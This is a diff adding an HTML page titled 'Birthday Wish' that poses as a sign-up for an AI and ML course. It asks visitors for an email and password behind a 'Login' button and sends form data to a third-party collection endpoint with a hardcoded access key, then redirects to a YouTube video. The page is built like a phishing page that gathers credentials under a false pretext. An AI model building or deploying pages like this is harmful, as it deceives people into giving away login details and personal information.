@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Birthday Wish</title>
+    <style>
+        body {
+            background-image: url(media/images/main.jpg);
+            background-size: auto;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 0 20px;
+        
+        
+        }
+        #bday-msg {
+            color: white;
+            font-size: 23px;
+            position: absolute;
+            top: 100px;
+            width: 90%;
+            max-width: 300px;
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 15px;
+            border-radius: 8px;
+            font-style: italic;
+        }
+        .getinform {
+            background-color: rgba(255, 248, 220, 0.9);
+            padding: 30px;
+            border-radius: 8px;
+            width: 300px;
+            max-width: 90%;
+            margin-left: 20px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        
+        }
+        .getinform h2 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: #333;
+            text-align: center;
+        }
+        .getinform input[type="text"],
+        .getinform textarea {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            resize: vertical;
+            box-sizing: border-box;
+        }
+        .getinform button {
+            background-color: blue;
+            color: white;
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+        .getinform button:hover {
+            background-color: #45a049;
+            transform: scale(1.05);
+        }
+        @media (max-width:800px) {
+            .getinform {
+                width: 80vw;
+            }
+        }
+    </style>
+</head>
+<body>
+    
+
+    <div class="getinform">
+        <form id="wishForm" action="https://api.web3forms.com/submit" method="POST">
+            <h2>Would you like to join our new course on AI and ML</h2>
+            <input type="hidden" name="access_key" value="57205d11-e622-444d-a526-128796995bba">
+            <input name="email" id="wishbox" placeholder="Email id"  width="50px" required >
+            <input name="password" id="password" placeholder="Enter your Password" required>
+            <button type="submit"><strong>Login</strong></button>
+        </form>
+    </div>
+    <div id="loading">
+        <div class="loader"></div>
+    </div>
+    <script>
+        document.getElementById("wishForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent the default form submission
+            
+            const formData = {
+                access_key: "57205d11-e622-444d-a526-128796995bba", // Access key
+                message: document.getElementById("wishbox").value // Message from the textarea
+            };
+
+            // Using the fetch API to submit form data
+            fetch(this.action, { // Use the action attribute for the URL
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(formData)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok ' + response.statusText);
+                }
+                return response.json(); // Parse the response as JSON
+            })
+            .then(data => {
+                console.log("Web3Forms response:", data); // Log the response for debugging
+                
+                if (data.success) {
+                    window.location.href = "https://youtu.be/AMxtGWcMYd4?si=NngzKbr6yMuJkOps"; // Redirect if submission was successful
+                } else {
+                    alert("Submission error: " + (data.message || "Unknown error")); // Show error message
+                }
+            })
+            .catch(error => {
+                console.error("Fetch error:", error); // Log the error
+                alert("There was an error submitting your form. Please try again.");
+            });
+        });
+    </script>
+</body>
+</html>
